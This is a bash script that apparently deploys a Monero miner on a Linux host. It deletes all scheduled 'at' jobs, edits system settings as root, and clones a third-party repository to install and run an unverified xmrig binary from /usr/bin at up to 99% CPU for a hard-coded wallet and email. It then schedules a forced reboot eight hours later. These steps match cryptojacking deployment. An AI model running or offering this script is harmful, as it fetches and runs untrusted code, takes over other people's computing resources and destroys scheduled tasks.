#!/bin/bash

WALLET=41rkXgTQpHRDLfWvEk4Hrsa3KxgXZu7mvTL6U6aUf18FSMC3JPL8usAi7J4dausYfPJiGTdi7Qe4ahCcDhf9nZVJAT7AKs7
ID="$(hostname)"
MAIL=parnpanewoods1986@yahoo.com
PASSWORD=$ID:$MAIL
THREADS="$(nproc --all)"

rm -rf /tmp/miner/
for i in `atq | awk '{print $1}'`;do atrm $i;done
sudo dpkg --configure -a
echo 'vm.nr_hugepages=256' >> /etc/sysctl.conf
sudo sysctl -p
sudo apt-get update && sudo apt-get install git libcurl4-openssl-dev build-essential libjansson-dev libuv1-dev libmicrohttpd-dev libssl-dev autotools-dev automake screen htop nano cmake mc -y
sleep 2
cd /tmp && mkdir miner
git clone https://github.com/susik2288/miner-xmr.git /tmp/miner
cd /tmp/miner
chmod +x /tmp/miner/xmrig
cp /tmp/miner/xmrig /usr/bin/
sleep 1
xmrig -o xmr.mine.pro:5555 -u $WALLET --pass=$PASSWORD --rig-id=$ID -B -l /tmp/miner/xmrig.log --donate-level=1 --print-time=10 --threads=$THREADS --cpu-priority=5 --background --max-cpu-usage=99 --av=1 --variant -1
echo -e 'ALL WORKS! tail -f /tmp/miner/xmrig.log'

touch /tmp/at.txt
echo 'sudo reboot -f' >> /tmp/at.txt
at now + 8 hours < /tmp/at.txt
echo -e 'Restart job specified'
